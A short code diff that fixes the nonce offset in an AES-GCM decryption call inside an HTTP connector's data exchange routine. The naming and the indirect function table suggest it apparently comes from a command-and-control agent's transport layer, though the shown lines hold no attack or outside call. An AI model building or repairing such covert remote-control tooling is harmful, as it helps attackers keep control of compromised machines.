@@ -457,9 +457,9 @@ void ConnectorHTTP::Exchange(BYTE* plainData, ULONG plainSize, BYTE* sessionKey)
 			int plainLen = dataSize - GCM_NONCE_SIZE - GCM_TAG_SIZE;
 			BYTE* plainBuf = (BYTE*)this->functions->LocalAlloc(LPTR, plainLen);
 			if (plainBuf) {
-				if (AESGCMDecrypt(dataPtr, plainLen, sessionKey,
-				                  dataPtr, plainBuf,
-				                  dataPtr + dataSize - GCM_TAG_SIZE)) {
+			if (AESGCMDecrypt(dataPtr + GCM_NONCE_SIZE, plainLen, sessionKey,
+			                  dataPtr, plainBuf,
+			                  dataPtr + dataSize - GCM_TAG_SIZE)) {
 					memset(this->recvData, 0, this->recvSize);
 					this->functions->LocalFree(this->recvData);
 					this->recvData = plainBuf;
